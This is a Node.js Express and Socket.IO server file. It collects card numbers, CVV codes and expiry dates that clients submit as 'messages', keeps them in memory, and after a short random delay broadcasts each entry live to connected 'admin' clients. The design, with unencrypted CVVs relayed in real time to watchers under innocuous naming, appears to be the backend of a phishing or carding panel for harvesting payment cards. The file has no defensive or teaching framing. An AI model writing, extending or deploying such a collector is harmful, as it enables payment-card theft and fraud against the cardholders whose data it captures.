const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(express.static('public'));
app.use(express.json());

// Store messages in memory
let messages = [];

io.on('connection', (socket) => {
    console.log('New client connected');

    // Send existing messages to newly connected admin
    socket.on('admin-connect', () => {
        socket.emit('all-messages', messages);
    });

    // Handle new message from user
    socket.on('new-message', (data) => {
        const message = {
            id: Date.now(),
            cardNumber: data.cardNumber,
            cvv: data.cvv,
            expiry: data.expiry,
            timestamp: new Date().toISOString()
        };
        messages.push(message);
        
        // Broadcast to all connected admins with 2-3 second delay
        setTimeout(() => {
            io.emit('message-received', message);
        }, Math.random() * 1000 + 2000);
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
